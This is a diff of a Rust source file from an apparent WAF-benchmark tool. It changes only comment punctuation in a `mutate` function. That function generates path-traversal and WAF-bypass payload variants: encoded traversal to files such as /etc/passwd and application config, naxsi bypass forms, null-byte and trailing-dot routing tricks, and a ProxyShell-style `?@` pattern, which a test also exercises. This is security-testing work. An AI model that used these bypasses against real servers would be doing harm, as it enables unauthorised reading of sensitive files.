@@ -27,7 +27,7 @@ pub fn mutate(payload: &str) -> Vec<String> {
     // Insertion-ordered: callers like bench-waf `take(args.variants)`
     // the FIRST N results, so priority order matters. We pre-pend the
     // naxsi-friendly absolute paths so they're always sampled first.
-    // Default capacity 32 — empirical upper bound on this mutator's
+    // Default capacity 32, empirical upper bound on this mutator's
     // output across the bench corpus. Caller truncates, this is just
     // an allocation hint.
     let mut results: Vec<String> = Vec::with_capacity(32);
@@ -40,7 +40,7 @@ pub fn mutate(payload: &str) -> Vec<String> {
     let target = infer_target_path(payload);
     // ANTI-RIG: the encoded-traversal forms used to be hardcoded to
     // `etc/passwd` regardless of what the operator actually asked to
-    // read — so a `../../../../var/www/app/config/db.yml` attack
+    // read, so a `../../../../var/www/app/config/db.yml` attack
     // "mutated" into a `/etc/passwd` read. That is a different attack,
     // and the de-rigged bench would claim "you can read db.yml" when
     // only passwd was ever tested. Every encoded form now traverses to
@@ -51,7 +51,7 @@ pub fn mutate(payload: &str) -> Vec<String> {
     // `/.ssh/id_rsa`, …) is the legitimate "read a sensitive file"
     // probe arsenal ONLY when the operator's target is itself the
     // generic passwd/system probe. For a specific target those sibling
-    // files are a different attack — emit the operator's real file as
+    // files are a different attack, emit the operator's real file as
     // the no-`..` naxsi-friendly form instead.
     let tl = target.to_ascii_lowercase();
     let generic = tl.is_empty()
@@ -93,7 +93,7 @@ pub fn mutate(payload: &str) -> Vec<String> {
             push(naxsi_friendly.to_string(), &mut results, &mut seen);
         }
     } else {
-        // The operator's REAL target, no `..` — the naxsi bypass for
+        // The operator's REAL target, no `..`: the naxsi bypass for
         // exactly the file they asked for, not a canned sibling.
         push(format!("/{tgt}"), &mut results, &mut seen);
         push(format!("/{tgt}%00.json"), &mut results, &mut seen);
@@ -153,12 +153,12 @@ pub fn mutate(payload: &str) -> Vec<String> {
     // ── Path-routing parser-disagreement family (Tsai class) ─────────
     // Frontend (WAF / proxy / CDN) and backend (origin app) often
     // disagree on path canonicalisation. The frontend strips one form,
-    // the backend keeps it — and the routing decision flips. Every
+    // the backend keeps it, and the routing decision flips. Every
     // variant below has been observed in real CVEs / bounty reports
     // against IIS, Tomcat, Spring Boot, nginx, traefik, etc.
     //
     // We use the inferred target (e.g. `/etc/passwd`) but the same
-    // patterns work to reach `/admin`, `/internal/`, etc — these are
+    // patterns work to reach `/admin`, `/internal/`, etc, these are
     // generic routing-bypass primitives.
     let stripped = target.trim_start_matches('/');
     for routing in [
@@ -175,12 +175,12 @@ pub fn mutate(payload: &str) -> Vec<String> {
         format!("/public/?@{stripped}"),
         format!("/public/#/{stripped}"),
         format!("/public/%23/{stripped}"),
-        // Null in path — IIS truncates at \0, others don't.
+        // Null in path: IIS truncates at \0, others don't.
         format!("/public/%00/{stripped}"),
         format!("/{stripped}/%00.json"),
         format!("/{stripped}/.json"),
         // Trailing-dot / trailing-space (Windows paths normalise these
-        // away, Linux doesn't — and routers disagree).
+        // away, Linux doesn't (and routers disagree)).
         format!("/{stripped}."),
         format!("/{stripped}/."),
         format!("/{stripped}%20"),
@@ -345,7 +345,7 @@ mod tests {
 
     #[test]
     fn generates_proxy_shell_pattern() {
-        // The Orange Tsai ProxyShell shape — `?@` between fake-allowed
+        // The Orange Tsai ProxyShell shape: `?@` between fake-allowed
         // prefix and real target.
         let m = mutate("../../../etc/passwd");
         assert!(
